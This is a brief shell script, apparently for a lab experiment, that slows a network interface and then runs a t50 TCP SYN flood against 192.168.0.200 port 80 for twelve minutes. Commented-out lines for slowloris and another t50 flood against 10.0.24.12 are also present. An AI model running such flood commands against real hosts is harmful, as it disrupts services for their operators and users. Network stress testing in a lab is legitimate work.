#!/bin/sh

ethtool -s eth2 speed 10 duplex full

sleep 60

#Start slowloris
#/root/slowloris.pl/slowloris.pl -dns 10.0.24.12 &

#Start t50
#/root/t50-5.4.1/t50 10.0.24.12 --flood --turbo &
/root/t50-5.4.1/t50 192.168.0.200 --flood --turbo --dport 80 -S --protocol TCP &

sleep 720

#killall slowloris.pl
killall t50

echo '1' >> /root/log
sleep 5
